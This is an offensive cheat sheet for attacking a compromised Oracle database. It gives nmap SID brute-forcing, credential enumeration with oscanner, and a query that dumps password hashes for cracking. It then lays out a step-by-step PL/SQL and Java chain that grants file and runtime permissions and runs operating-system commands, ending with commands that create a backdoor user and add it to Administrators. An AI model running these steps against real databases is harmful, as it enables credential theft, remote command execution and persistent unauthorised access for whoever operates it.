# ORACLE Database Cheat Sheet
This module will provide us with enough information to get going with a compromised Oracle database.

## Database Discovery
Nmap can be used to discover a database running on our target system like so,

`nmap -A -p 1521 (TARGET IP ADDRESS)`

## Database Enumeration
Once discovered, we can perform some light and heavy enumeration. We must be careful not to lock out any accounts.

### NMAP NSE Scripts
Nmap can be used to brute force a SID from an Oracle service. This is essentially the Database name. I would recommend building your own oracle-sids file to use from your other service / os / etc enumeration results. Even the hostname / domain names can be added to this file.

`nmap --script oracle-sid-brute -p 1521 (TARGET IP ADDRESS)`

### OScanner
[oscanner](https://tools.kali.org/vulnerability-analysis/oscanner) is a tool that can be used to enumerate users and passwords from a database.

`root@kali:~# oscanner -s (TARGET IP ADDRESS)`

## SQL Syntax
We can issue the following commands with an interface to the database. This could be SQLPlus, or DBeaver.

### Get all Usernames and Hashed Passwords:
To concatenate the usernams and passwords with a colon to be used by John the Ripper, do:

`SELECT Username || ':' || PASSWORD AS credentials FROM DBA_USERS;`

## SYSTEM-Level Command Excecution
**Step 1: Add the correct permissions.** 

This PL/SQL query will take a minute or two to complete and cannot be done using __dbeaver__, it must be done with the __sqlPlus>__ client provided by __Oracle__ to avoid a serious escaping issue with the driver used by dbeaver.
```
DECLARE
  l_schema VARCHAR2(30) := 'SYSTEM';
BEGIN
  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/
```
If successful, it will say *PL/SQL procedure successfully completed.* If using SQLPlus, don't worry about the added numbers, that is a flaw with the terminal / shell in the garbage Oracle code for SQLPlus; it will be ignored when executed.

**Step 2: Create Java Code to Execute:**

This SQL will create a Java class called `mycmd` and a method in the class called `execCommand`.

```
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "mycmd" AS
import java.lang.*;
import java.io.*;
 
public class mycmd
{
 public static void execCommand (String command) throws IOException
 {
     Runtime.getRuntime().exec(command);
 }
};
/
```
If successful you will see *Java created.*

**Step 3: Create a Procedure**

```
CREATE OR REPLACE PROCEDURE run_cmd (p_command IN VARCHAR2)
AS LANGUAGE JAVA
NAME 'mycmd.execCommand (java.lang.String)';
/
```
If successful, you will see *Procedure Created*.

**Step 4: Execute Commands (__1 COMMAND AT A TIME__):**

`exec run_cmd('net user npn pwned12345 /add');`

`exec run_cmd('net localgroup Administrators npn /add');`

If each command is successful, you will see *PL/SQL procedure successfully completed.*. If there is a failure, start the whol process over from step 1 and make sure that the formatting is correct and that each SQL query completes successfully. If you accidentally try two commands at once, you will be disobeying the interface of the class / method of mycmd.execCommand and the server will restart your SQL session state and you will have to start over again anyways.
